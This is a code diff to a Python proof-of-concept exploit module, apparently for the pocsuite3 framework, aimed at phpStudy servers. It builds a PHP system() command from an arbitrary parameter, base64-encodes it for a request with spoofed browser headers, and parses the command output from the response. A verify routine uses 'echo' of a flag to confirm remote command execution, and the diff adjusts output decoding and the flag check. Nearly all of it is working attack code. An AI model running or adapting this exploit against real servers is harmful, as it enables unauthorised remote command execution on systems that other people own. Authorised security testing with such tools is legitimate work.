@@ -80,8 +80,6 @@ class PhpstudyPoc(POCBase):
         # headers = {'Content-Type': 'application/x-www-form-urlencoded'}
         excute_cmd = f"system('{param}');"
 
-        print(excute_cmd)
-
         base64_excute_cmd = base64.b64encode(excute_cmd.encode()).decode()
         headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
@@ -93,9 +91,9 @@ class PhpstudyPoc(POCBase):
 
         # 处理返回信息
         respond = res.content[res.content.find(b'11111111') + 8:res.content.find(b'22222222')]
-        # result = respond.decode('GBK')
+        result = respond.decode('GBK')
         logger.debug(respond)
-        return respond
+        return result
 
     # 如果命令行不带参数，_verify就会默认执行
     def _verify(self):
@@ -104,7 +102,7 @@ class PhpstudyPoc(POCBase):
         param = f'echo {flag}'
         res = self._exploit(param)
         print(type(res))
-        if res and flag in res:
+        if flag in res:
             result['VerifyInfo'] = {}
             result['VerifyInfo']['URL'] = self.url
             result['VerifyInfo'][param] = flag
